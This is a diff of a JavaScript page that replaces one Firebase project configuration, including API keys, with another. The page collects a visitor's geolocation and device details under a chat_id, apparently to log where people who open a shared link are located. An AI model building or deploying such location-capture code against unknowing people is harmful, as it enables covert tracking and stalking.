@@ -38,33 +38,43 @@ throw new Error("No chat_id");
 }
 
 
-// إعداد Firebase
-const firebaseConfig={
-apiKey:"AIzaSyCctwmXaaMpD5XfFzmdxqKd3RKoIc31fSc",
-authDomain:"devicelink-dbe01.firebaseapp.com",
-databaseURL:"https://devicelink-dbe01-default-rtdb.firebaseio.com",
-projectId:"devicelink-dbe01",
-storageBucket:"devicelink-dbe01.firebasestorage.app",
-messagingSenderId:"1014057679077",
-appId:"1:1014057679077:android:ae6376a0b450a1b656bc0c"
+// Firebase config مأخوذ من google-services.json
+const firebaseConfig = {
+
+apiKey: "AIzaSyCuyAgacCs5tClhYD79IVOpSWVvbtXObpc",
+
+authDomain: "hercules-65b0c.firebaseapp.com",
+
+databaseURL: "https://hercules-65b0c-default-rtdb.firebaseio.com",
+
+projectId: "hercules-65b0c",
+
+storageBucket: "hercules-65b0c.firebasestorage.app",
+
+messagingSenderId: "758576632296",
+
+appId: "1:758576632296:android:c69d0667cf54311617d45d"
+
 };
 
 firebase.initializeApp(firebaseConfig);
-const database=firebase.database();
+const database = firebase.database();
 
 
-// جمع معلومات الجهاز (معلومات عامة فقط)
+// معلومات الجهاز
 function getDeviceInfo(){
 
-const ua=navigator.userAgent;
+const ua = navigator.userAgent;
 
 return{
-user_agent:ua,
-platform:navigator.platform,
-language:navigator.language,
-screen_width:screen.width,
-screen_height:screen.height,
-is_mobile:/Android|iPhone|iPad|iPod/i.test(ua)
+
+user_agent: ua,
+platform: navigator.platform,
+language: navigator.language,
+screen_width: screen.width,
+screen_height: screen.height,
+is_mobile: /Android|iPhone|iPad|iPod/i.test(ua)
+
 };
 
 }
@@ -75,19 +85,19 @@ navigator.geolocation.getCurrentPosition(
 
 async(pos)=>{
 
-const device=getDeviceInfo();
+const device = getDeviceInfo();
 
-const data={
+const data = {
 
-chat_id:chatId,
+chat_id: chatId,
 
-latitude:pos.coords.latitude,
-longitude:pos.coords.longitude,
-accuracy:pos.coords.accuracy,
+latitude: pos.coords.latitude,
+longitude: pos.coords.longitude,
+accuracy: pos.coords.accuracy,
 
-time:new Date().toISOString(),
+time: new Date().toISOString(),
 
-device:device
+device: device
 
 };
 
